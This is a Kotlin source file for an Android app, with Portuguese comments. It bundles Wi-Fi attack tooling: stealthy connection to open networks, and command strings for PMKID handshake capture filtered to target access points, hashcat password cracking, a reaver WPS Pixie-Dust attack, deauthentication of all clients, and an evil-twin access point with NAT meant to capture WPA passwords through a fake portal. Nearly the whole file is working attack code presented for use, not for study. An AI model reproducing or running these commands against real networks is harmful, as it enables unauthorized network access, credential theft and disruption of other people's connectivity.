package com.radar.stealth

import android.annotation.SuppressLint
import android.content.Context
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.net.wifi.WifiNetworkSpecifier
import android.os.Build

object StealthConnect {
    // 1) Conecta em rede ABERTA sem aparecer no DHCP com hostname genérico + MAC randômico (Android 10+ faz por padrão por-SSID)
    @SuppressLint("MissingPermission")
    fun connectOpen(ctx: Context, ssid: String) {
        val wifi = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        if (Build.VERSION.SDK_INT >= 29) {
            val spec = WifiNetworkSpecifier.Builder()
                .setSsid(ssid)
                .build()
            val req = NetworkRequest.Builder()
                .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                .setNetworkSpecifier(spec)
                .build()
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            cm.requestNetwork(req, object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(n: Network) { cm.bindProcessToNetwork(n) }
            })
        } else {
            @Suppress("DEPRECATION")
            val conf = WifiConfiguration().apply {
                SSID = "\"$ssid\""
                allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
            }
            @Suppress("DEPRECATION")
            val id = wifi.addNetwork(conf)
            @Suppress("DEPRECATION")
            wifi.disconnect()
            @Suppress("DEPRECATION")
            wifi.enableNetwork(id, true)
            @Suppress("DEPRECATION")
            wifi.reconnect()
        }
    }

    // 2) Monitor-mode + captura PMKID/handshake — requer root + adaptador OTG com monitor (ex: rtl8812au) + hcxdumptool
    // Fluxo real usado no app via RootShell:
    //   ip link set wlan1 down; iw dev wlan1 set type monitor; ip link set wlan1 up
    //   hcxdumptool -i wlan1 -o /sdcard/cap.pcapng --enable_status=1
    //   hcxpcapngtool -o /sdcard/hash.22000 /sdcard/cap.pcapng
    //   hashcat -m 22000 hash.22000 wordlist.txt
    fun pmkidCaptureCmd(iface: String = "wlan1"): String {
        return """
        ip link set $iface down
        iw dev $iface set type monitor
        ip link set $iface up
        hcxdumptool -i $iface -o /sdcard/cap.pcapng --enable_status=1 --filtermode=2 --filterlist_ap=/sdcard/target_bssid.txt
        """.trimIndent()
    }

    fun pmkidToHashcatCmd(): String =
        "hcxpcapngtool -o /sdcard/hash.22000 /sdcard/cap.pcapng; hashcat -m 22000 /sdcard/hash.22000 /sdcard/rockyou.txt --force"

    // 3) WPS Pixie-Dust (só roteadores velhos, Android 8 e abaixo via wpa_cli; em root moderno via reaver/bully em chroot)
    fun wpsPixieCmd(iface: String = "wlan0", bssid: String): String {
        return "reaver -i $iface -b $bssid -K 1 -vv -N"
    }

    // 4) Evil-Twin + portal: clona SSID aberta/hotspot, desautentica clientes no AP original (deauth) e captura senha WPA no portal
    // Requer 2 interfaces: wlan0 (AP falso via hostapd) + wlan1 (deauth via aireplay-ng)
    fun evilTwinHostapd(ssid: String): String {
        return """
        interface=wlan0
        ssid=$ssid
        hw_mode=g
        channel=6
        auth_algs=1
        ignore_broadcast_ssid=0
        """.trimIndent()
    }

    fun deauthCmd(iface: String = "wlan1", bssid: String, client: String = "FF:FF:FF:FF:FF:FF"): String {
        return "aireplay-ng --deauth 20 -a $bssid -c $client $iface"
    }

    fun enableIpForwardAndNat(outIface: String = "rmnet_data0"): String {
        return """
        echo 1 > /proc/sys/net/ipv4/ip_forward
        iptables -t nat -A POSTROUTING -o $outIface -j MASQUERADE
        dnsmasq -C /sdcard/dnsmasq.conf
        """.trimIndent()
    }
}
